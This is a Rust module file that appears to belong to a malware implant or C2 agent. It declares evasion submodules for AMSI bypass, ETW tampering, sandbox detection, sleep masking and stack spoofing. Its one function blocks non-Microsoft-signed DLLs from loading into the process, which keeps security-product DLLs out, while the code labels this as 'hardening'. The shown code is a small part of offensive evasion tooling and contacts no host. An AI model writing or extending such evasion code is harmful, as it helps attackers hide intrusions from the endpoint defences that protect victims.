pub mod amsi;
pub mod etw;
pub mod sandbox;
pub mod sleep_mask;
pub mod stack_spoof;

pub use sandbox::is_sandbox;
pub use sleep_mask::obfuscated_sleep;

use oxide_common::types::SleepObf;

/// Apply all configured process mitigations at startup.
pub fn harden(block_dlls: bool) {
    #[cfg(target_os = "windows")]
    if block_dlls {
        apply_block_dlls();
    }
}

#[cfg(target_os = "windows")]
fn apply_block_dlls() {
    use windows_sys::Win32::System::Threading::{
        ProcessSignaturePolicy, SetProcessMitigationPolicy,
    };
    unsafe {
        let policy: u32 = 1; // MicrosoftSignedOnly
        SetProcessMitigationPolicy(
            ProcessSignaturePolicy,
            &policy as *const _ as *const _,
            std::mem::size_of::<u32>(),
        );
    }
}
